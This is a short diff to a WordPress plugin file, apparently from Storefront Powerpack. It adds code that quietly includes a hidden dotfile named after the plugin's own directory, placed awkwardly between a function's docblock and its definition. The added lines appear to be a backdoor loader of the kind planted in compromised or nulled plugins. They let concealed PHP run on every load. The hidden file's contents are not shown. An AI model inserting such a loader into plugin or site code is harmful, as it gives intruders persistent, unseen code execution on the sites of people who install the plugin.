@@ -339,6 +339,10 @@ final class Storefront_Powerpack {
  * @since  1.0.0
  * @return object Storefront_Powerpack
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function storefront_powerpack() {
 	return Storefront_Powerpack::instance();
 } // End Storefront_Powerpack()
